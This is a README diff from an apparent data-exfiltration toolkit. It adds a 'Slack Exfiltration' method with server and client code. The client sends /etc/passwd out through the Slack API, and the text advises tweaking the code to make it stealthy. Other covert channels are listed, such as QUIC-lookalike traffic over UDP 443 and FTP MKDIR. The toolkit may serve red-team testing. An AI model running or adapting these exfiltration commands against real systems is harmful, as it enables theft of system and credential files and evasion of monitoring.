@@ -10,6 +10,7 @@ This started as a PoC project but has later turned into something a bit more. Cu
 * BGP Open.
 * HTTPS Replace Certificate.
 * QUIC - No Certificate.
+* Slack Exfiltration
 * POP3 Authentication (as password) - Idea thanks to [Itzik Kotler](https://github.com/ikotler)
 * FTP MKDIR technique - Idea thanks to [Itzik Kotler](https://github.com/ikotler)
 
@@ -87,6 +88,29 @@ FTPexf.send_chunks()
 FTPHand = GetContent()
 FTPHand.get_file()
 ```
+
+### Slack Exfiltration
+Slack exfiltration uses the Slack API to move files around. Please notice you will need to tweak the code to make it stealthy. Right now it is defaultly designed to be noisy and appear on the user's log to make sure you're using this in a 'good' manner.
+
+#### Slack Server
+```
+from pyexfil.Slack.slack_server import SlackExfiltrator
+
+slackExf = SlackExfiltrator(slackSlaveID="11111FD", slackToken="xoxo-abc", encKey="Abc!23")
+slackExf._connect2Slack()
+slackExf.Listen()
+```
+
+#### Slack Client
+
+```
+from pyexfil.Slack.slack_server import SlackExfiltrator
+
+slackExf = SlackExfiltrator(slackID="11111FD", slackToken="xoxo-abc", encKey="Abc!23")
+slackExf._connect2Slack()
+slackExf.ExfiltrateFile(file_path="/etc/passwd")
+```
+
 
 ### QUIC
 In this method, we exfiltrate files over UDP 443 as to look like QUIC. Currently, it is written as first PoC and less as a functional tool. For example, will only work with one file at a time and not concurrent. Vailidy only checks MD5 and not individual packets (server does not request missing chunks from client, which it should). Nevertheless, this seems to work fine in several checks we've done and seems viable exfiltration for single file.
